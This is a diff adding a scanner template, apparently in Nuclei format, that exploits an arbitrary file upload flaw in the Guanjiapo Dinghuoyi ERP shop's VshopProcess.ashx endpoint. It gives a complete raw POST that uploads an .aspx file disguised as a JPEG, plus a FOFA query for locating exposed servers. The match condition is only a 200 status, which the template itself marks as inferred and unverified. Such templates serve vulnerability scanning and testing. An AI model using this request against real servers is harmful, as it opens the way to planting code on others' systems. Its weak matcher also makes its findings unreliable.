@@ -1,0 +1,43 @@
+id: poc-mygsk1muerlnqxsl
+info:
+  name: 管家婆订货易在线商城VshopProcess存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mygsk1muerlnqxsl
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mygsk1muerlnqxsl
+    fofa: title="订货易"||title="管家婆分销ERP" || body="管家婆分销ERP" || body="ERP V3"
+http:
+- raw:
+  - 'POST /API/VshopProcess.ashx?action=PostFileImg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/57.0.578.100 Safari/537.36
+
+    Accept-Encoding: gzip
+
+    Connection: close
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCOFhbEjc3IfYaY5
+
+    ------WebKitFormBoundarytCOFhbEjc3IfYaY5
+
+    Content-Disposition: form-data; name="fileup1i"; filename="a.aspx"
+
+    Content-Type: image/jpeg
+
+    <% Response.Write("Test"); %>
+
+    ------WebKitFormBoundarytCOFhbEjc3IfYaY5--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
